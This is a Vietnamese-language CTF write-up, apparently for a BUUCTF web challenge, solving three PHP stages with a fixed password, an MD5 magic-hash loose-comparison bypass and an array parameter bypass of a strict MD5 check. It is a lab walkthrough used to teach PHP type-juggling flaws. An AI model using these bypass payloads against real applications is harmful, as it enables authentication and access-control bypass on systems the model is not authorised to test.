Mở challenge lên thì challenge tự động reddirect đến `/leveldo4.php`. Ở trang này cho 1 form để sumbit.Challenge có source code sẵn

```leveldo4.php
<?php
error_reporting(0);
$password = $_GET['password'];

if($password == 'ffifdyop')
{
    echo "<script>window.location.replace('./levels91.php')</script>";
}

?>
```
Vậy thì ta chỉ cần nhập `ffifdyop` là có thể sang `/levels91.php`.

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/a71d36a7-cf96-4e22-ac39-b2ff8e6916b0)

Mình thử viewsource thì phát hiện ra hint

```php
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->
```

Ở đây theo đề thì ta phải upload cho a và b thông qua method GET sao cho a khác b và md5 của a và b bằng nhau.Ở so sánh md5 là loose comparison và do md5 có nhiều magic hash nên ta có thể láy bất kì.

https://github.com/spaze/hashes/blob/master/md5.md

`?a=QLTHNDT&b=QNKCDZO`

Tiếp theo là màn cuối

```php
<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
}
```

Ta sẽ POST lên 2 tham số param1 và param2 khác nhau và md5 của 2 cái khác nhau.Nhưng ở đây sử dụng strict comparison `!==` nên ko sử dụng cách trước được.

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/9c063ef4-7295-481b-9021-fda62564ddba)

Nhưng ta có thể sử dụng `regular array bypass` là ta sẽ cho param a và b là array. Ví dụ

```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```

Vậy thì

```php
<?php
$a = array('aaa','ccc');
$b = array(1,2,3);
 
var_dump(md5($a));  // NULL
var_dump(md5($b));  // NULL
?>
```

md5() của 1 biến array trong php sẽ là NULL.Vậy chỉ cần đổi param1 và param2 thành array là xong rồi

```php
param1[]=a&param2[]=b
```

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/d945440b-b553-40c8-af9e-d7df69dd54f7)
